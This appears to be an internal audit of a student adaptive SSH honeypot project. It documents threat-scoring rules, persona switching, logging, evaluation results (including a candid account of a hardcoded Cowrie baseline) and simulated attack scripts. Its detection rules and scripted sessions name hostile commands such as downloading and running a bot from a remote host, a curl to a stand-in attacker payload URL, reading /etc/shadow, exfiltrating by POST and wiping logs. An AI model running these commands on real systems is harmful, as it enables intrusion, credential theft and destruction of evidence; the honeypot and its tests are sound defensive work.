  3. `credential_harvesting` (+15 bonus): Both `passwd` and `shadow` substrings seen anywhere in session history.
  4. `ssh_key_theft_attempt` (+12 bonus): `.ssh` seen in history and any key token (`id_rsa`, `id_ed25519`, `authorized_keys`) appears in commands.
  5. `download_and_execute` (+20 bonus): `wget` or `curl` seen in history AND execution command (`chmod +x`, `chmod 755`, `bash `, `sh `, `./`) in the last 5 commands.
  6. `network_mapping` (+10 bonus): Network enumeration binary (`netstat` or `ss`) AND `arp` seen in history.
  7. `active_network_scan` (+18 bonus): Binary `nmap` or `masscan` executed.
  8. `persistence_attempt` (+15 bonus): At least 2 commands matching persistence keywords (`crontab`, `cron.d`, `rc.local`, `systemd`, `.bashrc`, `.profile`, `/etc/init.d`).
  9. `data_staging` (+15 bonus): Command `find` with `-size` or `-name` AND compression binary (`tar`, `zip`, `gzip`, `bzip2`) seen.
- **Thresholds & Persona Switch Rules ([`threat_scorer.py:332-340, 473-526`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L332-L340)):**
  - Levels: `0–20: LOW`, `21–50: MEDIUM`, `51–80: HIGH`, `81–100: CRITICAL`.
  - Escalation rule 1: Score >= 51 triggers transition to `dev_workstation` (if current is generic).
  - Escalation rule 2: Score >= 81 triggers transition to `finance_server` (if not already finance).
  - Escalation rule 3: Force patterns (`download_and_execute`, `credential_harvesting`, `privilege_escalation_chain`) force an immediate +1 step-up.
  - Invariant rules: Persona never switches backward. `MAX_SWITCHES = 2` maximum switches per session.

---

### 6. Persona Switcher (`honeypot/persona_switcher.py`)
- **Change Queues Per Persona Transition:**
  - `generic_linux -> dev_workstation` ([`persona_switcher.py:83-161`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/persona_switcher.py#L83-L161)): **8 atomic change events**:
    - *Seeding:* (1) Add dir `/home/john.dev`, (2) Add file `/home/john.dev/.gitconfig`.
    - *Building:* (3) Add process `node --watch server.js`, (4) Add dir `/home/john.dev/projects/webapp`, (5) Add file `/home/john.dev/projects/webapp/.env` (DB creds).
    - *Completing:* (6) Add dir `/home/john.dev/.ssh`, (7) Add file `/home/john.dev/.ssh/id_rsa` (private SSH key bait), (8) Add process `dockerd`.
  - `* -> finance_server` ([`persona_switcher.py:164-249`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/persona_switcher.py#L164-L249)): **9 atomic change events**:
    - *Seeding:* (1) Add dir `/home/finapp`, (2) Add process PostgreSQL.
    - *Building:* (3) Add dir `/home/finapp/config`, (4) Add file `/home/finapp/config/database.yml` (production DB password), (5) Add dir `/home/finapp/reports`, (6) Add file `/home/finapp/reports/q1-2026-transactions.csv`.
    - *Completing:* (7) Add dir `/home/finapp/logs`, (8) Add file `/home/finapp/logs/audit.log`, (9) Add process Java Spring Boot (`finapp-service-2.3.1.jar`).
- **Phases:** `IDLE`, `SEEDING`, `BUILDING`, `COMPLETING`, `DONE`.
- **Steps & Draining Behavior:**
  - Transition duration: `5` steps (`transition_steps=5`).
  - Draining rate: `batch_size = max(1, min(2, round(per_step)))` (1 to 2 changes per command). Final step flushes all remaining items in the queue.
- **Queueing Behavior:**
  - If a switch is triggered while another transition is in progress, it is stored in `self._queued` and automatically launched when the current transition finishes.

---

### 7. Logger (`event_logging/session_logger.py`)
- **Public Class:** `SessionLogger` ([`session_logger.py:46`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/event_logging/session_logger.py#L46))
- **File Output:** Daily rotated files: `event_logging/logs/honeypot.jsonl` (and `honeypot.jsonl.YYYY-MM-DD`).
- **Data Structures / Event Types:**
  - `session_start`: `session_id`, `attacker_ip`, `attacker_port`, `start_time`.
  - `command`: `session_id`, `command`, `cwd`, `threat_score_after`, `persona`, `response_source` (`"dict"` or `"llm"`), `threat_category`, `threat_score_delta`, `threat_level`, `patterns_detected`.
  - `session_end`: `session_id`, `end_time`.
- **Failure Handling:**
  - `_write_log_entry()` catches all OS/I/O exceptions, logs to stderr via standard Python `logging.error()`, preventing logging disk errors from breaking honeypot terminal execution.

---

### 8. Dashboard Backend & Frontend (`dashboard/app.py`, `app/`, `lib/`)
- **REST Endpoints:**
  - `GET /`: Serves standalone HTML dashboard template (`dashboard/templates/index.html`).
  - `GET /api/sessions`: List active sessions and durations.
  - `GET /api/sessions/{session_id}/timeline`: Score history for specific session.
  - `GET /api/commands?limit=50`: Recent command history ring buffer (last 200).
  - `GET /api/stats`: Aggregate stats (total sessions, active sessions, unique IPs, switches, average score, fingerprint score).
  - `GET /api/scripts`: Returns metadata catalog for 8 demo and evaluation scripts.
  - `GET /api/scripts/status`: Returns current background execution status and last 50 log lines.
  - `POST /api/session/start`: Ingest session start event.
  - `POST /api/session/command`: Ingest command event.
  - `POST /api/session/switch`: Ingest persona switch event.
  - `POST /api/session/end`: Ingest session termination event.
  - `POST /api/fingerprint`: Update fingerprint evaluation score.
  - `POST /api/dashboard/clear`: Reset in-memory dashboard data structures.
  - `POST /api/scripts/run`: Spawn catalog script in a background subprocess (`subprocess.Popen`).
  - `POST /api/scripts/stop`: Terminate running background script.
- **WebSocket Behavior (`/ws`):**
  - Accepts connections, registers client to `_ws_clients` set, sends full dashboard snapshot immediately on connect, and loops sending updates every 2.0 seconds. Also broadcasts on HTTP ingestion events.
- **Next.js Frontend Connection Status (Real Backend vs. Simulator):**
  - Configured in `.env.local`: `NEXT_PUBLIC_HONEYPOT_WS_URL=ws://localhost:8080/ws`.
  - In `lib/use-honeypot-data.ts:37-75`: Connects to `ws://localhost:8080/ws` if configured.
  - **Fallback Simulator:** If `NEXT_PUBLIC_HONEYPOT_WS_URL` is unset, or if WebSocket fails to open within **2.5 seconds** (`connectTimeout = 2500ms`), or on WebSocket error/close, the UI automatically transitions to `"demo"` mode and instantiates `HoneypotSimulator` ([`lib/simulator.ts:51`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/lib/simulator.ts#L51)).
  - In demo mode, `HoneypotSimulator` runs locally in browser memory, ticking every 2000ms to fake attacker IP connections and commands.

---

## C. KNOWN ISSUES AND DEVIATIONS

### 1. Fingerprint Resistance Figure Conflict (22/22 vs 21/22 vs 19/22)
- **Status:** **NOT FIXED (Documented vs Actual Conflict)**
- **Where Each Figure Comes From:**
  - `22/22`: Appears in [`dashboard/app.py:551`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/dashboard/app.py#L551) and [`components/script-launcher.tsx:145`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/components/script-launcher.tsx#L145) under catalog highlights: `"22/22 Fingerprint resistance pass check"`.
  - `19/22`: Appears in [`evaluation/README.md:9`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/evaluation/README.md#L9) header: `### 1. Fingerprint Resistance — 19/22 vs Cowrie 8/22`. (Note: The category table immediately below line 9 sums to 3 + 5 + 5 + 3 + 5 = 21/22).
  - `21/22`: This is the **TRUE MEASURED VALUE** produced by the evaluation checker and recorded in [`evaluation/fingerprint_report.txt:31`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/evaluation/fingerprint_report.txt#L31) and [`evaluation/fingerprint_report.json:5`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/evaluation/fingerprint_report.json#L5).
- **Command Producing True Value:**
  ```powershell
  python scripts/run_evaluation.py
  ```
  *Output:* `Our System: 21/22 PASS, Cowrie: 8/22 PASS`.
- **Why it is 21/22 (and not 22/22):**
  Check `timing_simple_cmd` fails. It asserts that command `ls` responds in `< 200ms`. In actual runs, elapsed time is `1073.8ms` due to dispatch initialization overhead and asyncio loop startup. In pytest, `test_timing_simple_cmd_passes` fails for this exact reason.

---

### 2. Cowrie Baseline (8/22): Measured or Hardcoded?
- **Status:** **HARDCODED (NOT MEASURED)**
- **Evidence:** [`tests/fingerprint_tests/fingerprint_checker.py:611-649`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/tests/fingerprint_tests/fingerprint_checker.py#L611-L649)
  ```python
  def run_against_cowrie_baseline(self) -> List[CheckResult]:
      """Score all 22 checks against expected vanilla Cowrie behavior.

      Returns hardcoded results based on known Cowrie weaknesses.
      Cowrie typically fails on consistency, write ops, and signatures.
      """
      return [
          CheckResult("timing_simple_cmd", True, "< 200ms", "~50ms", "Cowrie is fast"),
          CheckResult("timing_complex_cmd", False, "> 10ms jitter", "Instant response", "Cowrie has no timing jitter"),
          ...
      ]
  ```
  The method literally returns a static Python list containing exactly 8 `True` and 14 `False` `CheckResult` objects. It is NOT measured against a running Cowrie honeypot.

---

### 3. Cowrie Dispatcher Uses `SimpleSession` Instead of `SessionManager`
- **Status:** **NOT FIXED (Architectural Bypass Remains in Code)**
- **Evidence:**
  - [`honeypot/cowrie_hook.py:37, 107-112`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/cowrie_hook.py#L37):
    ```python
    from dictionary.command_handlers import SimpleSession
    ...
    self._session = SimpleSession(
        current_directory=user_info.home,
        current_user=user_info.username,
        command_history=[],
        environment=dict(env),
    )
    ```
  - [`cowrie_integration/cowrie_command_patch.py:51-68`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/cowrie_integration/cowrie_command_patch.py#L51-L68): Calls `create_dispatcher()`, which instantiates `HoneypotCommandDispatcher`.
- **What Gets Bypassed:**
  1. `SessionManager` ([`honeypot/session_manager.py`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/session_manager.py)) is completely bypassed during real Cowrie SSH dispatch.
  2. IP Reputation check (`check_ip_reputation(attacker_ip)` via AbuseIPDB) is never called in `HoneypotCommandDispatcher`; no IP reputation scoring or initial threat bonus occurs during SSH connections.
  3. Session registry (`_sessions` dict, session TTL cleanup, session retrieval) in `SessionManager` never registers Cowrie SSH connections.
  *(Note: Persona switching itself is NOT bypassed because `HoneypotCommandDispatcher` instantiates its own `PersonaSwitcher` instance directly).*

---

### 4. LLM Latency Figures & API Key Usage
- **Status:** **LOCAL-ONLY / FALLBACK ONLY (NO REAL API KEY CONFIGURED)**
- **Evidence:**
  - No `.env` file exists in the repository.
  - Environment check confirms `GEMINI_API_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` are all `False` (unset).
  - All automated test suites and evaluation scripts run with API keys unset.
  - When LLM path is triggered, `_detect_llm_provider()` returns `("none", "")` and immediately returns `_fallback_response(binary)` (`-bash: {binary}: command not found`) in ~0ms.
  - Any LLM latency figures cited in documentation (e.g. `< 2000ms`) or timeout limits (3.0s) are architectural design targets, NOT measured cloud API round-trip benchmarks.

---

### 5. TODO / FIXME Comments in Code

*Exact Code Occurrences:*
1. [`tests/test_fakefs.py:6`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/tests/test_fakefs.py#L6): `# TODO(Sprint 2): test each FakeFS query method returns expected shape.`
2. [`tests/test_fakefs.py:7`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/tests/test_fakefs.py#L7): `# TODO(Sprint 2): test persona JSON loads + validates via pydantic schema.`
3. [`tests/test_fakefs.py:8`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/tests/test_fakefs.py#L8): `# TODO(Sprint 2): test unknown paths raise FileNotFoundError, protected`
4. [`scripts/run_tests.sh:5`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/scripts/run_tests.sh#L5): `# TODO(Sprint 2+): pytest -q tests/`
5. [`scripts/run_tests.sh:6`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/scripts/run_tests.sh#L6): `# TODO(Sprint 6): separate invocation for fingerprint_tests against a live VM.`
*(Note: No `FIXME` comments exist in the repository).*

---

### 6. Bibliography Entries With TODO Markers
- **Status:** **NO BIBLIOGRAPHY FILE EXISTS IN REPO**
- There are no `.bib`, `.tex`, or bibliography markdown files in the repository. Citations throughout the codebase are informal in-line comments (e.g. "MPI study", "literature", "GTFOBins").

---

## D. EVALUATION: WHAT EXISTS AND WHAT IT MEASURES

### 1. Evaluation Scripts & Harnesses

#### Test Suite 1: Fingerprint Resistance Evaluation
- **Script/File:** [`scripts/run_evaluation.py`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/scripts/run_evaluation.py) (Part 1), [`tests/test_fingerprint.py`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/tests/test_fingerprint.py), [`tests/fingerprint_tests/fingerprint_checker.py`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/tests/fingerprint_tests/fingerprint_checker.py)
- **What It Does:** Executes 22 probes testing timing variance, cross-command entity coherence, kernel version realism, write operation persistence, and honeypot signature suppression.
- **Inputs:** In-memory command calls via `HoneypotCommandDispatcher`.
- **Outputs:** `evaluation/fingerprint_report.txt`, `evaluation/fingerprint_report.json`.
- **How to Run:** `python scripts/run_evaluation.py` or `pytest tests/test_fingerprint.py`
- **Actual Measured Result (Executed 2026-10-24):**
  - **Our System:** **21/22 Passed (95.5%)**
  - **Cowrie Baseline:** **8/22 Passed (36.4%)**
  - **Failed Check on Our System:** `timing_simple_cmd` (actual 1073.8ms vs expected < 200ms).
- **Limitations (What it does NOT prove):**
  - Probes are invoked directly against Python class `HoneypotCommandDispatcher`, NOT across an active TCP/SSH network socket.
  - The Cowrie baseline (8/22) is hardcoded from a static lookup table, not measured against a live Cowrie process.
  - Does not test industry fingerprint scanners like Nmap NSE scripts (`ssh-auth-methods`, `ssh2-enum-algos`) or Honeydet.

#### Test Suite 2: FakeFS Cross-Reference Consistency Suite
- **Script/File:** [`tests/test_consistency.py`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/tests/test_consistency.py)
- **What It Does:** Verifies cross-reference invariants across all 3 personas (124 assertions): `whoami` appears in `/etc/passwd`, `hostname` matches `/etc/hostname` and `uname -n`, `ps aux` matches `netstat` ports, file sizes match string lengths, `/home` user directories exist.
- **Inputs:** `personas/generic_linux.json`, `personas/dev_workstation.json`, `personas/finance_server.json`.
- **Outputs:** Pytest pass/fail assertions.
- **How to Run:** `pytest tests/test_consistency.py`
- **Actual Measured Result (Executed 2026-10-24):**
  ```
  collected 124 items
  tests\test_consistency.py ............................................................................................................................ [100%]
  124 passed in 1.08s
  ```
- **Limitations:** Validates static persona state consistency; does not validate complex dynamic POSIX kernel edge cases (e.g., hardlinks, file locking, socket IPC).

#### Test Suite 3: 25-Command Attacker Session Simulation (Depth Progression)
- **Script/File:** [`scripts/run_evaluation.py`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/scripts/run_evaluation.py) (Part 2)
- **What It Does:** Simulates a 25-command attack sequence spanning reconnaissance, exploration, privilege escalation, and exfiltration. Tracks real-time threat score accumulation, level progression, and persona transitions.
- **Inputs:** Hardcoded list of 25 terminal commands in `SIMULATION_COMMANDS`.
- **Outputs:** `evaluation/session_simulation.json`.
- **Actual Measured Result (Executed 2026-10-24):**
  - Total Commands: 25
  - Final Threat Score: **100/100**
  - Persona Switches: **2 switches triggered**
    - Switch 1 at Command #16 (`sudo -l`): `generic_linux -> dev_workstation` (Score: 55)
    - Switch 2 at Command #21 (`curl http://attacker.com/payload`): `dev_workstation -> finance_server` (Score: 100)
  - Progression by Level:
    - Low Threat (Commands 1–9): 9 commands
    - Medium Threat (Commands 10–15): 6 commands
    - High Threat (Command 16): 1 command
    - Critical Threat (Commands 17–25): 9 commands
    - Level 3+ (High + Critical): 10/25 commands = **40%**
  - Execution Time: **37 seconds**
- **Limitations:** Scripted sequence; not real human attacker behavior.

---

### 2. Live Attacker Data Verification: Does Real Live Data Exist?

**VERDICT: NO LIVE DATA EXISTS.**

*Detailed Log File Audit:*
Across all 10 log files in `event_logging/logs/`:
- Total log lines: **6,836**
- Total unique session IDs: **441**
- Total commands logged: **6,333**
- Unique IP addresses appearing across all logs: **9 IPs**
  1. `0.0.0.0` (Local dispatcher default in unit tests)
  2. `192.168.1.100` (Hardcoded IP in `tests/test_fingerprint.py` and `tests/test_sprint3_acceptance.py`)
  3. `10.0.0.1` (Hardcoded IP in `tests/test_threat_integration.py`)
  4. `185.220.101.42` (Hardcoded Tor exit node IP in `scripts/demo_session.py`, `scripts/run_evaluation.py`, and `scripts/attack_scenarios.py`)
  5. `103.45.98.112` (Hardcoded IP in `scripts/demo_session_2.py`)
  6. `45.14.224.18` (Hardcoded IP in `scripts/demo_session_3.py`)
  7. `61.177.173.12` (Hardcoded IP in `scripts/attack_scenarios.py` credential scenario)
  8. `92.118.39.84` (Hardcoded IP in `scripts/attack_scenarios.py` privesc scenario)
  9. `45.137.21.9` (Hardcoded IP in `scripts/interactive_honeypot.py` and `lib/simulator.ts`)

Every single log entry in `event_logging/logs/` was produced by local automated test suites, demo runs, or simulated attack scripts. There are zero sessions originating from an internet-facing public cloud VM deployment. Line 360 of [`scripts/run_evaluation.py`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/scripts/run_evaluation.py#L360) explicitly documents:
`"Limitation: simulated attacker, not live traffic — real deployment is future work"`.

---

## E. SIMULATED / DEMO SESSIONS

Every script listed below produces **SIMULATED** data:

1. **`scripts/demo_session.py`**
   - **Type:** SIMULATED
   - **Target Persona:** Starts at `generic_linux` (IP: `185.220.101.42`).
   - **Sequence (10 commands):** `whoami`, `id`, `uname -a`, `sudo -l`, `cat /etc/shadow`, `cat /etc/passwd`, `cat /home/john.dev/.gitconfig`, `ls -la /home/john.dev`, `cat /home/john.dev/.env`, `ps aux`.
   - **Output:** Simulates privilege escalation and credential exfiltration. Triggers persona switch to `dev_workstation` at command #5. Pushes live updates via HTTP to `dashboard/app.py`.

2. **`scripts/demo_session_2.py`**
   - **Type:** SIMULATED
   - **Target Persona:** Starts at `generic_linux` (IP: `103.45.98.112`).
   - **Sequence (14 commands):** Stealth recon, downloads `linpeas.sh` into `/tmp`, makes executable, archives webapp directory with `tar -czf`, exfiltrates via `curl POST`, wipes archive with `rm -f`, and clears history.
   - **Output:** Demonstrates ephemeral file persistence in `SessionOverlay`.

3. **`scripts/demo_session_3.py`**
   - **Type:** SIMULATED
   - **Target Persona:** Starts at `generic_linux` (IP: `45.14.224.18`).
   - **Sequence (10 commands):** Steals SSH private key (`cat ~/.ssh/id_rsa`), attempts lateral SSH connection, runs `nmap`, overwrites financial transaction CSV with `"ENCRYPTED"`, attempts log wipe (`rm -rf /var/log/*`).
   - **Output:** Demonstrates escalation to CRITICAL threat level and persona switch to `finance_server`.

4. **`scripts/attack_scenarios.py`**
   - **Type:** SIMULATED
   - **Scenarios (4):**
     - `botnet`: 14 rapid automated commands (`uname`, `/proc/cpuinfo`, `wget http://45.9.148.99/bins/x86.bot`, `chmod +x`, `./x86.bot`). IP: `185.220.101.42`.
     - `credential`: 17 slow deliberate commands hunting for `.env`, SSL certificates, `.bash_history`. IP: `61.177.173.12`.
     - `privesc`: 17 commands checking GTFOBins, SUID binaries (`find / -perm -4000`), crontab, sudoers. IP: `92.118.39.84`.
     - `persistence`: 17 commands injecting backdoor user to `/etc/passwd`, crontab persistence, clearing auth logs. IP: `5.188.206.18`.

5. **`scripts/interactive_honeypot.py`**
   - **Type:** SIMULATED
   - **What It Does:** Launches an interactive terminal console emulating an attacker SSH session directly in PowerShell/bash. Dispatches commands to `HoneypotCommandDispatcher`.

6. **`lib/simulator.ts`**
   - **Type:** SIMULATED
   - **What It Does:** TypeScript class in the Next.js frontend generating synthetic WebSocket updates every 2 seconds when disconnected from the FastAPI backend.

---

## F. ARCHITECTURE-LEVEL FACTS FOR DIAGRAMS

### 1. Data Flow For One Command (Fast Path vs. LLM Path)

```
[Attacker / SSH Client]
          │
          │ raw keystrokes / command line
          ▼
1. cowrie_integration/cowrie_command_patch.py: handle_command(dispatcher, raw_input)
          │
          ▼
2. honeypot/cowrie_hook.py: HoneypotCommandDispatcher.dispatch(raw_input)
          │  (dispatches via event loop)
          ▼
3. honeypot/cowrie_hook.py: HoneypotCommandDispatcher.dispatch_async(raw_input)
          │
          ▼
4. honeypot/response_engine.py: ResponseEngine.handle_command(raw_input, session)
          │
          ▼
5. honeypot/command_parser.py: parse_command(raw_input) -> ParsedCommand
          │
          ▼
6. dictionary/command_registry.py: lookup(parsed.binary)
          │
          ├─── [MATCH FOUND: FAST PATH] ──────────────────────────────────────────┐
          │                                                                       │
          │  7a. dictionary/command_handlers.py: handler(fakefs, session, parsed) │
          │      (Queries FakeFS state and/or session.overlay)                    │
          │                                                                       │
          │  8a. honeypot/response_engine.py: _apply_redirection()                │
          │      (If > or >> present, writes to session.overlay)                  │
          │                                                                       │
          │  9a. honeypot/response_engine.py: apply_timing_jitter("fast_path")    │
          │      (Sleeps 10ms–50ms, or 50ms–200ms for slow commands)             │
          │                                                                       │
          │  Returns: (output_text, "fast_path", ThreatDecision)                  │
          │                                                                       │
          └─── [NO MATCH: LLM SLOW PATH] ─────────────────────────────────────────┤
                                                                                  │
             7b. honeypot/response_engine.py: build_llm_prompt(fakefs, session)   │
                 (Calls fakefs.get_llm_context_summary(), formats history)        │
                                                                                  │
             8b. honeypot/response_engine.py: call_llm_with_fallback(..., 3.0s)   │
                 - _detect_llm_provider() checks GEMINI_API_KEY then ANTHROPIC    │
                 - If no key/timeout/error: returns _fallback_response(binary)    │
                 - If key present: calls _call_gemini() or _call_anthropic()      │
                                                                                  │
             9b. honeypot/response_engine.py: post_process_response(text)         │
                 (Strips markdown code fences, bold, commentary, forbidden words) │
                                                                                  │
             10b. honeypot/response_engine.py: apply_timing_jitter("llm")         │
                  (0s delay for LLM; 50ms–150ms for fallback)                     │
                                                                                  │
             Returns: (output_text, "llm"|"fallback", ThreatDecision)             │
                                                                                  │
          ┌───────────────────────────────────────────────────────────────────────┘
          │
          ▼
7. honeypot/threat_scorer.py: ThreatScorer.score_command(raw_input, session)
   ├── Layer 1: EXACT_MATCH_SCORES lookup (143 commands)
   ├── Layer 2: BINARY_SCORES + ARGUMENT_ESCALATORS lookup (45 binaries, 29 args)
   ├── PatternDetector.detect(history, raw_input): checks 9 multi-command patterns
   └── PersonaSwitchDecider.should_switch(persona, score, count, patterns)
       Returns -> ThreatDecision
          │
          ▼
8. honeypot/cowrie_hook.py (Post-Processing & State Updates):
   ├── If PersonaSwitcher.is_transitioning(): apply_next_changes(overlay)
   ├── If decision.trigger_persona_switch: initiate_switch(session_id, from, to)
   ├── session.command_history.append(...)
   ├── session.threat_score = max(session.threat_score, decision.new_total_score)
   ├── event_logging/session_logger.py: SessionLogger.log_command(...)
   └── cowrie_hook.py: _notify_dashboard("/api/session/command", payload)
          │
          ▼
9. Return response text to Cowrie SSH protocol -> terminal output to Attacker
```

### 2. State Each Session Holds

#### State in `SimpleSession` ([`dictionary/command_handlers.py:46-60`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/dictionary/command_handlers.py#L46-L60)):
1. `current_directory: str`: Current working directory (e.g. `/home/ubuntu`, `/tmp`).
2. `current_user: str`: Active user name (`ubuntu`, `john.dev`, `finapp`, `root`).
3. `command_history: List[dict]`: Ordered list of commands containing `raw`, `output`, `source`, `cwd`, `category`, and `score_delta`.
4. `environment: Dict[str, str]`: Shell variables (`PATH`, `USER`, `HOME`, `SHELL`, `PS1`).
5. `overlay: SessionOverlay`: Ephemeral copy-on-write filesystem state holding created directories, modified file contents, and deleted path masks.
6. `threat_score: int`: Monotonically non-decreasing score (0–100).
7. `patterns_detected: Set[str]`: Cumulative set of fired attack pattern names.

#### Additional State in `SessionState` (when `SessionManager` is used) ([`honeypot/session_manager.py:41-74`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/session_manager.py#L41-L74)):
8. `session_id: str`: 12-character hex session UUID.
9. `attacker_ip: str`: Connecting IPv4 address.
10. `attacker_port: int`: Connecting TCP port.
11. `start_time: datetime`: UTC connection start timestamp.
12. `threat_level: ThreatLevel`: `low` | `medium` | `high` | `critical`.
13. `active_persona: str`: Currently active persona name.
14. `persona_switch_count: int`: Number of persona transitions executed (capped at 2).
15. `persona_transition_in_progress: bool`: Flag indicating active transition.
16. `persona_transition_target: Optional[str]`: Target persona name during transition.
17. `persona_transition_steps_remaining: int`: Countdown of steps remaining.
18. `ip_reputation: Optional[IPReputationResult]`: AbuseIPDB metadata (confidence score, country, usage type, initial bonus).
19. `categories_seen: Set[str]`: Set of attack categories observed during session.
20. `total_commands: int`: Cumulative command count.

---

## G. PARAMETERS THAT SHOULD STAY OUT OF PUBLIC TEXT

The following table compiles all internal thresholds, weights, name mappings, and timing parameters found in code:

| Parameter Name | Value in Code | Source File & Line |
|---|---|---|
| `LOW` threat threshold | `0 – 20` | [`honeypot/threat_scorer.py:334`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L334) |
| `MEDIUM` threat threshold | `21 – 50` | [`honeypot/threat_scorer.py:336`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L336) |
| `HIGH` threat threshold | `51 – 80` | [`honeypot/threat_scorer.py:338`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L338) |
| `CRITICAL` threat threshold | `81 – 100` | [`honeypot/threat_scorer.py:340`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L340) |
| `dev_workstation` score trigger | `new_score >= 51 and current_idx < 1` | [`honeypot/threat_scorer.py:509`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L509) |
| `finance_server` score trigger | `new_score >= 81 and current_idx < 2` | [`honeypot/threat_scorer.py:502`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L502) |
| Max persona switches per session | `MAX_SWITCHES = 2` | [`honeypot/threat_scorer.py:473`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L473) |
| Dangerous patterns forcing switch | `download_and_execute`, `credential_harvesting`, `privilege_escalation_chain` | [`honeypot/threat_scorer.py:516-520`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L516-L520) |
| `rapid_recon_burst` condition & bonus | 5+ recon commands in last 10 commands -> `+8` | [`honeypot/threat_scorer.py:389`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L389) |
| `privilege_escalation_chain` condition & bonus | 2+ priv-esc commands in last 5 commands -> `+12` | [`honeypot/threat_scorer.py:399`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L399) |
| `credential_harvesting` condition & bonus | `passwd` and `shadow` both seen in history -> `+15` | [`honeypot/threat_scorer.py:405`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L405) |
| `ssh_key_theft_attempt` condition & bonus | `.ssh` and (`id_rsa` / `id_ed25519` / `authorized_keys`) -> `+12` | [`honeypot/threat_scorer.py:410`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L410) |
| `download_and_execute` condition & bonus | `wget`/`curl` seen and execution command in last 5 -> `+20` | [`honeypot/threat_scorer.py:419`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L419) |
| `network_mapping` condition & bonus | `netstat`/`ss` and `arp` seen in history -> `+10` | [`honeypot/threat_scorer.py:425`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L425) |
| `active_network_scan` condition & bonus | `nmap` or `masscan` in history -> `+18` | [`honeypot/threat_scorer.py:429`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L429) |
| `persistence_attempt` condition & bonus | 2+ persistence keywords matching -> `+15` | [`honeypot/threat_scorer.py:436`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L436) |
| `data_staging` condition & bonus | `find` (-size/-name) and compression binary -> `+15` | [`honeypot/threat_scorer.py:444`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L444) |
| Persona transition steps | `transition_steps = 5` | [`honeypot/persona_switcher.py:68, 264`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/persona_switcher.py#L68) |
| Changes applied per transition step | `batch_size = max(1, min(2, round(per_step)))` | [`persona_switcher.py:346`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/persona_switcher.py#L346) |
